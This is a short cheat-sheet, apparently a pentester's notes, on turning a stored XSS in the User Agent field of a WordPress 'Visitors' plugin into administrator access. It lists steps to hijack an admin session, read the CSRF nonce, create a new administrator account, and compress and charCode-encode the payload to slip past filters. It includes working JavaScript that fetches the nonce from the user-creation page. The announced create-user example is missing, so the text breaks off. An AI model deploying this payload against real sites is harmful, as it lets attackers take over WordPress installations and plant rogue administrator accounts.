# Privilege Escalation via XSS

for a fictional wordpress server, say there is an xss in the 'User Agent'  for the Wordpress Plugin called 'Visitors' - if you can hook an admin's session via an xss you can then get the admin session to do something for you, such as:

* get the csrf protection nonce for the admin page (which is unique for each refresh of the page)
* submit to the admin panel to create a new user and set it as role administrator
* compress the javascript using https://jscompress.com
* then encode it to UTF-16 Integer Code using the charCodeAt method


eg: getting the nonce

```
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

eg: sending the nonce + create new user requst on your behalf

